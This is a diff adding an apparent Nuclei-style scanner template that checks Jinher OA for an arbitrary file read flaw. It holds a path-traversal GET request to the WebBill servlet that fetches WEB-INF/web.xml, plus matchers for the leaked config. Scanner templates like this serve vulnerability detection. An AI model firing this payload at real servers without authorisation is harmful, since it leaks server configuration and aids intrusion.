@@ -1,0 +1,26 @@
+id: poc-yaml-jinher-oa-webbill-anyfile-read
+info:
+  name: Jinher OA WebBill Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jc6/servlet/WebBill?key=GetFileContent&pathfile=/../WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "error404"
+          - "</web-app>"
+        part: body
+      - type: regex
+        regex:
+          - "<servlet-name>(.*?)</servlet-name>"
+          - "<filter-class>(.*?)</filter-class>"
+        part: body
